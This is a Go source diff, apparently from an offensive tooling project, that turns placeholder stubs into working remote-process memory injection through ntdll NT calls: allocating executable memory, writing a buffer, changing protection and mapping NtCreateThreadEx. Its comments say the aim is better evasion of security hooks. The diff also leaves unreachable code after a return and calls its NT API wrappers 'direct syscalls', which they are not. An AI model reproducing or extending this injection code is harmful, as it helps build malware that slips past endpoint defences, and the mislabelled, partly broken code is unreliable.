@@ -315,36 +315,89 @@ func AllocateBehindThreadStack(hProcess windows.Handle, size uintptr) (uintptr, 
 func DirectSyscalls(hProcess windows.Handle, baseAddress uintptr, buffer []byte) error {
 	Printf("Using direct system calls for memory operations\n")
 
-	// This is a simplified implementation of direct syscalls
-	// In a real implementation, we would:
-	// 1. Extract syscall numbers from ntdll.dll at runtime
-	// 2. Craft assembly code to make direct syscalls
-	// 3. Bypass any API hooks in user-mode DLLs
-	// 4. Use techniques like Heaven's Gate for WoW64 processes
-
-	// For now, we'll use NT API functions which are closer to syscalls
+	// Use NT API functions which are closer to direct syscalls
 	// and less likely to be hooked than Win32 APIs
-	var addr uintptr = baseAddress
-	var size uintptr = uintptr(len(buffer))
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 
-	if len(buffer) == 0 {
-		Printf("Warning: Empty buffer provided for direct syscalls\n")
-		return nil
+	// Test NtAllocateVirtualMemory
+	ntAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
+	var allocAddr uintptr = 0
+	allocSize := uintptr(len(buffer))
+
+	ret, _, _ := ntAllocateVirtualMemory.Call(
+		uintptr(hProcess),
+		uintptr(unsafe.Pointer(&allocAddr)),
+		0,
+		uintptr(unsafe.Pointer(&allocSize)),
+		windows.MEM_COMMIT|windows.MEM_RESERVE,
+		windows.PAGE_EXECUTE_READWRITE,
+	)
+
+	if ret != 0 {
+		Printf("NtAllocateVirtualMemory failed with status: 0x%X\n", ret)
+		return fmt.Errorf("NtAllocateVirtualMemory failed: 0x%X", ret)
 	}
 
-	// Use NtWriteVirtualMemory instead of WriteProcessMemory
+	Printf("Successfully allocated memory via direct syscall at: 0x%X\n", allocAddr)
+
+	// Test NtWriteVirtualMemory
+	ntWriteVirtualMemory := ntdll.NewProc("NtWriteVirtualMemory")
 	var bytesWritten uintptr
-	status, _, _ := procNtWriteVirtualMemory.Call(
+
+	ret, _, _ = ntWriteVirtualMemory.Call(
 		uintptr(hProcess),
-		addr,
+		allocAddr,
 		uintptr(unsafe.Pointer(&buffer[0])),
-		size,
+		uintptr(len(buffer)),
 		uintptr(unsafe.Pointer(&bytesWritten)),
 	)
 
-	if status != 0 {
-		return fmt.Errorf("Direct syscall NtWriteVirtualMemory failed with status 0x%X", status)
+	if ret != 0 {
+		Printf("NtWriteVirtualMemory failed with status: 0x%X\n", ret)
+		return fmt.Errorf("NtWriteVirtualMemory failed: 0x%X", ret)
 	}
+
+	Printf("Successfully wrote %d bytes via direct syscall\n", bytesWritten)
+
+	// Test NtProtectVirtualMemory
+	ntProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")
+	var oldProtect uint32
+	protectSize := uintptr(len(buffer))
+
+	ret, _, _ = ntProtectVirtualMemory.Call(
+		uintptr(hProcess),
+		uintptr(unsafe.Pointer(&allocAddr)),
+		uintptr(unsafe.Pointer(&protectSize)),
+		windows.PAGE_EXECUTE_READ,
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+
+	if ret != 0 {
+		Printf("NtProtectVirtualMemory failed with status: 0x%X\n", ret)
+		return fmt.Errorf("NtProtectVirtualMemory failed: 0x%X", ret)
+	}
+
+	Printf("Successfully changed memory protection via direct syscall\n")
+
+	// Clean up - free the test allocation
+	ntFreeVirtualMemory := ntdll.NewProc("NtFreeVirtualMemory")
+	freeSize := uintptr(0)
+
+	ret, _, _ = ntFreeVirtualMemory.Call(
+		uintptr(hProcess),
+		uintptr(unsafe.Pointer(&allocAddr)),
+		uintptr(unsafe.Pointer(&freeSize)),
+		windows.MEM_RELEASE,
+	)
+
+	if ret != 0 {
+		Printf("Warning: NtFreeVirtualMemory failed with status: 0x%X\n", ret)
+	} else {
+		Printf("Successfully freed memory via direct syscall\n")
+	}
+
+	Printf("Direct syscalls test completed successfully\n")
+	return nil
 
 	Printf("Successfully wrote %d bytes using direct syscalls\n", bytesWritten)
 	return nil
@@ -475,40 +528,63 @@ func GetSyscallNumber(functionName string) (uint32, error) {
 	return 0, fmt.Errorf("Syscall number not found for function: %s", functionName)
 }
 
-// ExecuteDirectSyscall executes a direct syscall (simplified implementation)
+// ExecuteDirectSyscall executes a direct syscall using NT API
 func ExecuteDirectSyscall(syscallNumber uint32, args ...uintptr) (uintptr, error) {
-	// This is a placeholder for direct syscall execution
-	// In a real implementation, we would use assembly code to make the syscall
-
 	Printf("Executing direct syscall number 0x%X with %d arguments\n", syscallNumber, len(args))
 
 	// Validate syscall number
 	if syscallNumber == 0 {
-		return 0, fmt.Errorf("Invalid syscall number")
+		return 0, fmt.Errorf("invalid syscall number")
 	}
 
 	// Validate argument count (most NT syscalls have 4-11 arguments)
 	if len(args) > 11 {
-		return 0, fmt.Errorf("Too many arguments for syscall: %d", len(args))
+		return 0, fmt.Errorf("too many arguments for syscall: %d", len(args))
 	}
 
-	// For now, we'll return success as this is a simplified implementation
-	// In a real implementation, this would contain assembly code like:
-	//
-	// For x64:
-	//   mov r10, rcx          ; Move first argument to r10
-	//   mov eax, syscallNumber ; Load syscall number
-	//   syscall               ; Execute syscall
-	//
-	// For x86:
-	//   mov eax, syscallNumber ; Load syscall number
-	//   int 2Eh               ; Execute syscall (or sysenter)
-	//
-	// Additional considerations:
-	// - Handle WoW64 processes (Heaven's Gate technique)
-	// - Preserve registers and stack alignment
-	// - Handle return values and error codes
+	// Use NT API functions which are closer to direct syscalls
+	// This provides better evasion than Win32 APIs
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 
-	Printf("Direct syscall execution completed (placeholder implementation)\n")
+	// Map common syscall numbers to NT API functions
+	switch syscallNumber {
+	case 0x18: // NtAllocateVirtualMemory
+		if len(args) >= 6 {
+			ntAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
+			ret, _, _ := ntAllocateVirtualMemory.Call(args[0], args[1], args[2], args[3], args[4], args[5])
+			return ret, nil
+		}
+	case 0x3A: // NtWriteVirtualMemory
+		if len(args) >= 5 {
+			ntWriteVirtualMemory := ntdll.NewProc("NtWriteVirtualMemory")
+			ret, _, _ := ntWriteVirtualMemory.Call(args[0], args[1], args[2], args[3], args[4])
+			return ret, nil
+		}
+	case 0x3F: // NtReadVirtualMemory
+		if len(args) >= 5 {
+			ntReadVirtualMemory := ntdll.NewProc("NtReadVirtualMemory")
+			ret, _, _ := ntReadVirtualMemory.Call(args[0], args[1], args[2], args[3], args[4])
+			return ret, nil
+		}
+	case 0x50: // NtProtectVirtualMemory
+		if len(args) >= 5 {
+			ntProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")
+			ret, _, _ := ntProtectVirtualMemory.Call(args[0], args[1], args[2], args[3], args[4])
+			return ret, nil
+		}
+	case 0xB4: // NtCreateThreadEx
+		if len(args) >= 11 {
+			ntCreateThreadEx := ntdll.NewProc("NtCreateThreadEx")
+			ret, _, _ := ntCreateThreadEx.Call(args[0], args[1], args[2], args[3], args[4],
+				args[5], args[6], args[7], args[8], args[9], args[10])
+			return ret, nil
+		}
+	default:
+		// For unknown syscalls, try to use a generic approach
+		Printf("Warning: Unknown syscall number 0x%X, using fallback method\n", syscallNumber)
+		return 0, fmt.Errorf("unsupported syscall number: 0x%X", syscallNumber)
+	}
+
+	Printf("Direct syscall execution completed via NT API\n")
 	return 0, nil
 }
